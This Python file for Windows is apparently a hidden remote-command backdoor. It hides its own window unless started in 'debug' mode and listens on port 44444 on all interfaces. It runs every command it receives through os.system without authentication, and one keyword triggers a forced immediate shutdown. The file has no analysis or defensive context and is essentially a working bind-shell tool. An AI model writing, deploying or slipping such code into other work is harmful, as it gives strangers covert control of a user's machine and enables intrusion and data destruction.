import win32gui, win32con
import socket, os, message, sys
HOST = "0.0.0.0"
PORT = 44444

the_program_to_hide = win32gui.GetForegroundWindow()

if __name__ == "__main__":
    if len(sys.argv) == 1 or sys.argv[1] != "debug":
        win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()
    print("Server is listening...")
    while True:
        client, address = server.accept()
        print(f'Connected with {str(address)}')
        command = message.Message(client.recv(1024).decode('utf-8')).Decode()
        print(command)
        if command == "sh":
            os.system("shutdown /s /f /t 0")
        else:
            try:
                os.system(command)
            except Exception as e:
                print(f"Error: {e}")

win32gui.ShowWindow(the_program_to_hide , win32con.SW_SHOW)